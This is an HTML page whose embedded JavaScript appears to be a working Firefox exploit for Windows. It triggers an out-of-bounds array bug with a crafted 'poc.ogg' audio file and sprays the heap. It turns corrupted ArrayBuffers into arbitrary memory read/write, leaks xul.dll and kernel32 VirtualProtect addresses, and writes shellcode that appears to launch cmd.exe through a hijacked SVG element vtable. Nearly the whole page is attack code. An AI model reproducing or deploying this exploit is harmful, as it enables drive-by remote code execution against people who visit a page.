<html>

<script>
function sleep(numberMillis) 
{ 
	var now = new Date(); 
	var exitTime = now.getTime() + numberMillis; 
	while (true) 
	{ 
		now = new Date(); 
		if (now.getTime() > exitTime) 
		return; 
	} 
}
var my_Array = new Array();
var bloack_size = 0x700;
var  _Length = 0;
var  _Index =  0;
for( var Index = 0; Index < bloack_size ; )
{
	my_Array[Index] = new Array(0x3e);
	for( var num = 0; num < 0x3e ; )
	{
		my_Array[Index][num] = 0x12340000+num;
		num++;
	}
	Index++;
}
//alert(my_Array[0].length);
// Release the array
for( var free_index = 0; free_index < bloack_size ; )
{
	my_Array[free_index].length = 0; 
	free_index += 2;
} 
//alert("look up");

var N_array = new Array();
for(var Index =0 ; Index < 0x100;)
{
	N_array[Index] = new Array(0x3e);
	Index++;
}
for( var free_index = 0; free_index < 0x100 ; )
{
	N_array[free_index].length = 0; 
	free_index += 2;
} 
alert("Array");


// Attach the ogg file
var audio = document.createElement("audio");
audio.src = "poc.ogg"; 
audio.play();
alert("ogg");


//look for Out of bounds array
for( var bounds_index = 1 ; bounds_index < bloack_size ; )
{
	if((my_Array[bounds_index]).length != 0x3e)
	{
		_Length = (my_Array[bounds_index]).length;
		_Index = bounds_index;
		alert(_Length.toString(16));
//		alert(_Index.toString(16));
		break;
	}
	bounds_index =bounds_index+2;
}

var temp_array1 = my_Array[_Index];
for(var k = 10; k < _Length ; k++)
{
	if( my_Array[_Index][k] == 0x12340000)
	{
		my_Array[_Index][k-1] = -127;
		my_Array[_Index][k-2] = 0;
//		alert(k);
		break;
	}
}

for( var k = _Index+1 ; bounds_index < bloack_size ; k++)
{
	if( ((my_Array[k]).length != 0x3e) && ((my_Array[k]).length != 0))
	{
		_Length = (my_Array[k]).length;
		_Index = k;
		break;
	}
}
var temp_array2 = my_Array[_Index];
//alert("new bound Array length:"+temp_array2.length.toString(16));


var my_Abuffer  = new Array();
for( var Index = 0 ; Index < 0x60000; )
{
	my_Abuffer[Index] = new ArrayBuffer(0x20);
	var U_32array = new Uint32Array(my_Abuffer[Index]);		

	U_32array[0] = 0x67890000;
	U_32array[1] = -127;
	U_32array[2] = 0x67890002;
	U_32array[3] = -127;
	
	Index += 1;
}



alert("look for");

var  j = 0xc00000;
var buffer_base_address ;
while(true)
{
	if(( temp_array2[j] == 0x67890000 ) && ( temp_array2[j+1] == 0x67890002 ))
	{
		temp_array2[j] = 0x10203040;

		if( temp_array2[j-3] == 0x00000020 )
		{
			temp_array2[j-3] = 0x77777777;
			alert("success");
			break;
		}
	}
	j++;
}

/* 
** View 1
*/
var Abuffer_Index = 0;
for( var k = 0 ; k < 0x60000 ; k++)
{
	if( my_Abuffer[k].byteLength != 0x20 )
	{
		Abuffer_Index = k;
		break;
	}

}

var Data_view1 = new DataView(my_Abuffer[Abuffer_Index]);

//alert("final buffer byteLength: " + my_Abuffer[Abuffer_Index].byteLength.toString(16));


/* 
** object + aray
*/
var myArray2= new Array();

for(var i=0 ; i<0x20000;i=i+3)
{
	myArray2[i] = 0x12003400;
	myArray2[i+1] = "firefox"+i;
}
for(var i = 2 ; i < 0x20000 ; i=i+3 )
{
	myArray2[i] = document.createElementNS("http://www.w3.org/2000/svg", "image");
}



/* 
** View 2
*/

var leak_address;
alert("leak address :");
for(var k = 0;;k=k+4)
{
	var tempDV = Data_view1.getUint32(k,true);
	var tempDV2 = Data_view1.getUint32(k+4*3,true);
	var tempDV3 = Data_view1.getUint32(k+4*5,true);
	if( tempDV == 0x12003400 && tempDV2 == 0xffffff86 && tempDV3 == 0xffffff8c )
	{
		leak_address = Data_view1.getUint32(k+4*4,true);
		break;
	}
}
alert("address : "+leak_address.toString(16));
Data_view1.setUint32(52*4,leak_address,true);
Data_view1.setUint32(54*4,0x00006666,true);

var Abuffer_Index_2 = 0;
for( var k = 0 ; k < 0x60000 ; k++)
{
	if( my_Abuffer[k].byteLength == 0x00006666 )
	{
		Abuffer_Index_2 = k;
//		alert(" ArrayBuffer2 byteLength = " + my_Abuffer[k].byteLength.toString(16));
		break;
	}
}

var Data_view2 = new DataView(my_Abuffer[Abuffer_Index_2]);
// leak xul.dll base_address
var xul_addr = Data_view2.getUint32(0+4*3,true) - 0x263cc20;

/* 
** View 3
*/

// get  xul!mozilla::dom::SVGImageElement::`vftable'
var point_SVG_vf_address = Data_view2.getUint32(0+4*4,true);
Data_view1.setUint32(72*4,point_SVG_vf_address,true);
Data_view1.setUint32(74*4,0x00005555,true);

var Abuffer_Index_3 = 0;
for( var k = 0 ; k < 0x60000 ; k++)
{
	if( my_Abuffer[k].byteLength == 0x00005555 )
	{
		Abuffer_Index_3 = k;
//		alert(" ArrayBuffer3 byteLength = " + my_Abuffer[k].byteLength.toString(16));
		break;
	}
}
var Data_view3 = new DataView(my_Abuffer[Abuffer_Index_3]);

/* 
** View 4
*/

// get  xul!nsSVGElement::BeforeSetAttr && xul!nsSVGElement::ParseAttribute
var vf_address = Data_view3.getUint32(0+4*0,true);
Data_view1.setUint32(92*4,vf_address,true);
Data_view1.setUint32(94*4,0x00004444,true);
var Abuffer_Index_4 = 0;
for( var k = 0 ; k < 0x60000 ; k++)
{
	if( my_Abuffer[k].byteLength == 0x00004444 )
	{
		Abuffer_Index_4 = k;
//		alert(" ArrayBuffer4 byteLength = " + my_Abuffer[k].byteLength.toString(16));
		break;
	}
}
var Data_view4 = new DataView(my_Abuffer[Abuffer_Index_4]);

var befSetAttr_addr = Data_view4.getUint32(0+4*0x6e,true);
var ParAttribu_addr = Data_view4.getUint32(0+4*0x6c,true);

/*
* view 5 for  improtTalbe = xul_BaseAddress + 2633000 + 1000
*/
var inport_xul_addr = xul_addr + 0x2633000 + 0x1000;
Data_view1.setUint32(112*4,inport_xul_addr,true);
Data_view1.setUint32(114*4,0x00003333,true);
var Abuffer_Index_5 = 0;
for( var k = 0 ; k < 0x60000 ; k++)
{
	if( my_Abuffer[k].byteLength == 0x00003333 )
	{
		Abuffer_Index_5 = k;
//		alert(" ArrayBuffer5 byteLength = " + my_Abuffer[k].byteLength.toString(16));
		break;
	}
}
var Data_view5 = new DataView(my_Abuffer[Abuffer_Index_5]);

/*
*	view 7 get xul header -> MZ + 3c = PE 
*/
// leak kernel32!VirtualProrect
var PE_offset = xul_addr + 0x3c ;
Data_view1.setUint32(132*4,PE_offset,true);
Data_view1.setUint32(134*4,0x00002222,true);
var Abuffer_Index_6 = 0;
for( var k = 0 ; k < 0x60000 ; k++)
{
	if( my_Abuffer[k].byteLength == 0x00002222 )
	{
		Abuffer_Index_6 = k;
		alert(" ArrayBuffer6 byteLength = " + my_Abuffer[k].byteLength.toString(16));
		break;
	}
}
var Data_view6 = new DataView(my_Abuffer[Abuffer_Index_6]);
/*
*	view 7 get PE addres ,and import table address 
*/
var PE_addre_0x80 = Data_view6.getUint32(0,true) + xul_addr +0x80 ;
Data_view1.setUint32(152*4,PE_addre_0x80,true);
Data_view1.setUint32(154*4,0x00001111,true);
var Abuffer_Index_7 = 0;
for( var k = 0 ; k < 0x60000 ; k++)
{
	if( my_Abuffer[k].byteLength == 0x00001111 )
	{
		Abuffer_Index_7 = k;
		alert(" ArrayBuffer7 byteLength = " + my_Abuffer[k].byteLength.toString(16));
		break;
	}
}
var Data_view7 = new DataView(my_Abuffer[Abuffer_Index_7]);

var imporTable_addre = Data_view7.getUint32(0,true) + xul_addr;

/*
*	view 8 imporTable_addre: every group have  5 dword .
*/ 
Data_view1.setUint32(172*4,PE_addre_0x80,true);
Data_view1.setUint32(174*4,0x00001231,true);
var Abuffer_Index_8 = 0;
for( var k = 0 ; k < 0x60000 ; k++)
{
	if( my_Abuffer[k].byteLength == 0x00001231 )
	{
		Abuffer_Index_8 = k;
		alert(" ArrayBuffer8 byteLength = " + my_Abuffer[k].byteLength.toString(16));
		break;
	}
}
var Data_view8 = new DataView(my_Abuffer[Abuffer_Index_8]);

var kernel32_YESNO = Data_view8.getUint32(0+4*3,true);



var ker32_VProt = Data_view5.getUint32(0+4*0x12c,true);
//alert("kernerl32 VProt = " +ker32_VProt.toString(16));
/*
*
*/
var point_eip_address = Data_view1.getUint32(192*4,true);
Data_view3.setUint32(0,point_eip_address,true);

// set xul!nsSVGElement::ParseAttribute
Data_view1.setUint32((92+8+100+110-2)*4,ParAttribu_addr,true);
// set xul!nsSVGElement::BeforeSetAttr
Data_view1.setUint32((92+8+100+110)*4,befSetAttr_addr,true);

// set eip
var offset_xchg = xul_addr+0x50c83;
Data_view1.setUint32((92+8+100+110-2+20)*4,offset_xchg,true);

/*
*	set shell code 
*/ 
// set kernel32!VirtualProrect
var shellcode_start = Data_view1.getUint32(352*4,true);
var temp = Data_view1.getUint32(332*4,true);
Data_view1.setUint32((92+8+100)*4,ker32_VProt,true);
Data_view1.setUint32((92+8+100+1)*4,shellcode_start,true);
Data_view1.setUint32((92+8+100+2)*4,temp,true);
Data_view1.setUint32((92+8+100+3)*4,0x500,true);
Data_view1.setUint32((92+8+100+4)*4,0x40,true);
Data_view1.setUint32((92+8+100+5)*4,temp,true);

// set shellcode 
Data_view1.setUint32((92+8+260)*4,0x90909090);
Data_view1.setUint32((92+8+260+1)*4,0x31c964a1); 
Data_view1.setUint32((92+8+260+2)*4,0x30000000); 
Data_view1.setUint32((92+8+260+3)*4,0x8b400c8b); 
Data_view1.setUint32((92+8+260+4)*4,0x7014ad96); 
Data_view1.setUint32((92+8+260+5)*4,0xad8b5810); 
Data_view1.setUint32((92+8+260+6)*4,0x8b533c01); 
Data_view1.setUint32((92+8+260+7)*4,0xda8b5278); 
Data_view1.setUint32((92+8+260+8)*4,0x01da8b72); 
Data_view1.setUint32((92+8+260+9)*4,0x2001de31);
Data_view1.setUint32((92+8+260+10)*4,0xc941ad01);
Data_view1.setUint32((92+8+260+11)*4,0xd8813847);
Data_view1.setUint32((92+8+260+12)*4,0x65745075);
Data_view1.setUint32((92+8+260+13)*4,0xf4817804);
Data_view1.setUint32((92+8+260+14)*4,0x726f6341);
Data_view1.setUint32((92+8+260+15)*4,0x75eb8178);
Data_view1.setUint32((92+8+260+16)*4,0x08646472);
Data_view1.setUint32((92+8+260+17)*4,0x6575e28b);
Data_view1.setUint32((92+8+260+18)*4,0x722401de);
Data_view1.setUint32((92+8+260+19)*4,0x668b0c4e);
Data_view1.setUint32((92+8+260+20)*4,0x498b721c);
Data_view1.setUint32((92+8+260+21)*4,0x01de8b14);
Data_view1.setUint32((92+8+260+22)*4,0x8e01da31);
Data_view1.setUint32((92+8+260+23)*4,0xf6525e31);
Data_view1.setUint32((92+8+260+24)*4,0xff535f31);
Data_view1.setUint32((92+8+260+25)*4,0xc9516878);
Data_view1.setUint32((92+8+260+26)*4,0x65630068);
Data_view1.setUint32((92+8+260+27)*4,0x57696e45);
Data_view1.setUint32((92+8+260+28)*4,0x89e15153);
Data_view1.setUint32((92+8+260+29)*4,0xffd231c9);
Data_view1.setUint32((92+8+260+30)*4,0x51686573);
Data_view1.setUint32((92+8+260+31)*4,0x73006850);
Data_view1.setUint32((92+8+260+32)*4,0x726f6368);
Data_view1.setUint32((92+8+260+33)*4,0x45786974);
Data_view1.setUint32((92+8+260+34)*4,0x89e15157);
Data_view1.setUint32((92+8+260+35)*4,0x31ff89c7);
Data_view1.setUint32((92+8+260+36)*4,0xffd631f6);
Data_view1.setUint32((92+8+260+37)*4,0x505e31c9);
Data_view1.setUint32((92+8+260+38)*4,0x51686578);
Data_view1.setUint32((92+8+260+39)*4,0x65006863);
Data_view1.setUint32((92+8+260+40)*4,0x6d642e89);
Data_view1.setUint32((92+8+260+41)*4,0xe16a0151);
Data_view1.setUint32((92+8+260+42)*4,0xffd76a00);
Data_view1.setUint32((92+8+260+43)*4,0xffd6ffff);
Data_view1.setUint32((92+8+260+44)*4,0xffff0000);
Data_view1.setUint32((92+8+260+45)*4,0x00ffffff);
Data_view1.setUint32((92+8+260+46)*4,0xff000000);
Data_view1.setUint32((92+8+260+47)*4,0x90909090);
Data_view1.setUint32((92+8+260+48)*4,0x90909090);




alert("SVGImageElement::`vftable");
for(var k = 2 ;k<0x20000;k = k+3)
{
	myArray2[k-1] = 0x0c0c0c0c;
	myArray2[k].setAttribute("height","100");
}



alert("exit");
</script>
<body></body>
</html>


